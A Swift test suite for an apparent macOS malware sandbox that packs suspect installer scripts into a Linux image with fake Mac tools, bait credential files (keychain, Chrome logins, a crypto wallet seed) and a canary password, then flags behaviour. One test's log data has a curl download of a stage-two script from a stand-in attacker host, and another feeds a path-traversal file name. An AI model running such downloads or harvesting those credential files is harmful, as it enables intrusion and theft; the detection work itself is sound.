import Foundation
import Testing

@testable import MacxCore

@Suite("Light chamber image")
struct ChamberImageTests {
    /// A tiny stand-in for the unpacked Alpine system: a file, a folder and busybox-style symlinks.
    func fakeRootfs(_ tmp: TempDir) throws -> URL {
        let root = tmp.url.appendingPathComponent("rootfs")
        _ = try tmp.file("rootfs/bin/busybox", "busybox")
        try FileManager.default.createSymbolicLink(
            atPath: root.appendingPathComponent("bin/uname").path, withDestinationPath: "/bin/busybox")
        try FileManager.default.createSymbolicLink(atPath: root.appendingPathComponent("bin/sh").path, withDestinationPath: "/bin/busybox")
        _ = try tmp.file("rootfs/etc/passwd", "root:x:0:0:root:/root:/bin/sh\n")
        return root
    }

    func entries(_ tmp: TempDir, sample: String, name: String = "installer.sh", seconds: Int = 30) throws -> [String: CPIOReader.Entry] {
        let f = try tmp.file("Downloads/\(name)", sample)
        let data = try ChamberImage.build(rootfs: fakeRootfs(tmp), sample: ChamberSample(pinning: f), seconds: seconds)
        return Dictionary(try CPIOReader.entries(data).map { ($0.name, $0) }, uniquingKeysWith: { _, b in b })
    }

    @Test func containsInitStandInsBaitAndTheSample() throws {
        let tmp = try TempDir()
        let e = try entries(tmp, sample: "#!/bin/zsh\necho hi\n", seconds: 45)
        let initScript = String(decoding: try #require(e["init"]).data, as: UTF8.self)
        #expect(try #require(e["init"]).mode & 0o777 == 0o755)
        #expect(initScript.contains("timeout -s KILL 45"))
        #expect(initScript.contains("strace -f -ttt -qq -s 4096"))
        #expect(initScript.contains("/bin/zsh ./installer.sh"))
        #expect(initScript.contains("==MACX-TRACE=="))
        // The sample sits in a fake Mac home, runnable.
        #expect(try #require(e["Users/chamber/Downloads/installer.sh"]).mode & 0o777 == 0o755)
        // Mac commands are stand-ins, at the paths macOS has them.
        for path in [
            "usr/bin/osascript", "usr/bin/security", "usr/bin/dscl", "usr/sbin/system_profiler", "usr/bin/sw_vers", "bin/launchctl",
        ] {
            let stub = try #require(e[path], "\(path) missing")
            #expect(stub.mode & 0o111 != 0, "\(path) not executable")
        }
        // busybox's uname is replaced by one that says Darwin (a symlink is replaced by a file).
        let uname = try #require(e["bin/uname"])
        #expect(uname.mode & 0o170000 == 0o100000)
        #expect(String(decoding: uname.data, as: UTF8.self).contains("Darwin"))
        // Bait files a stealer would go for.
        #expect(e["Users/chamber/Library/Keychains/login.keychain-db"] != nil)
        #expect(e["Users/chamber/Library/Application Support/Google/Chrome/Default/Login Data"] != nil)
        #expect(e["Users/chamber/Library/Application Support/Exodus/exodus.wallet/seed.seco"] != nil)
        // The rest of the system's symlinks stay symlinks.
        #expect(try #require(e["bin/sh"]).mode & 0o170000 == 0o120000)
    }

    @Test func standInsAnswerLikeAMac() throws {
        let tmp = try TempDir()
        let e = try entries(tmp, sample: "echo hi\n")
        func text(_ p: String) throws -> String { String(decoding: try #require(e[p]).data, as: UTF8.self) }
        #expect(try text("usr/sbin/system_profiler").contains("Mac15,3"))
        #expect(try !text("usr/sbin/system_profiler").lowercased().contains("virtual"))
        #expect(try text("usr/bin/sw_vers").contains("27.0.1"))
        // A fake password goes back to whatever asked, so the script carries on and shows what it does with it.
        #expect(try text("usr/bin/osascript").contains(ChamberImage.canaryPassword))
        #expect(try text("usr/bin/security").contains("login.keychain-db"))
    }

    @Test(arguments: [
        ("#!/bin/bash\necho\n", "/bin/bash"),
        ("#!/usr/bin/env zsh\necho\n", "/bin/zsh"),
        ("#!/bin/sh\necho\n", "/bin/sh"),
        ("echo no shebang\n", "/bin/zsh"),  // macOS's default shell
    ])
    func picksTheInterpreter(_ script: String, _ expected: String) throws {
        #expect(try ChamberImage.kind(of: Data(script.utf8)) == .script(interpreter: expected))
    }

    @Test func refusesWhatCantRunInLinux() {
        #expect(throws: ChamberImage.Problem.self) { try ChamberImage.kind(of: Data([0xCF, 0xFA, 0xED, 0xFE, 1, 2, 3, 4])) }  // Mach-O
        #expect(throws: ChamberImage.Problem.self) { try ChamberImage.kind(of: Data([0xCA, 0xFE, 0xBA, 0xBE, 0, 0, 0, 2])) }  // universal
        #expect(throws: ChamberImage.Problem.self) { try ChamberImage.kind(of: Data("FasdUAS 1.101.10".utf8)) }  // compiled AppleScript
        #expect(throws: ChamberImage.Problem.self) { try ChamberImage.kind(of: Data("#!/usr/bin/python3\nprint(1)\n".utf8)) }
    }

    @Test func sampleNamesAreMadeSafe() {
        #expect(ChamberImage.safeName("in staller (1).sh") == "in_staller__1_.sh")
        #expect(ChamberImage.safeName("../../etc/passwd") == "passwd")
        #expect(ChamberImage.safeName("") == "sample")
    }

    @Test func downloadsCountAsNetworkAttempts() {
        let exec =
            #"{"target":\#(proc("/usr/bin/curl", pid: 501, ppid: 500, platform: true)),"args":["curl","-fsSL","https://evil.example.invalid/stage2.sh"]}"#
        let r = ChamberJudge(guestHome: URL(fileURLWithPath: "/Users/chamber")).judge(
            log: Data(chamberLine("exec", pid: 500, path: "/bin/zsh", body: exec).utf8), samplePID: 500)
        #expect(r.alerts.contains { $0.rule == "network-attempt" && $0.detail == "https://evil.example.invalid/stage2.sh" })
    }
}
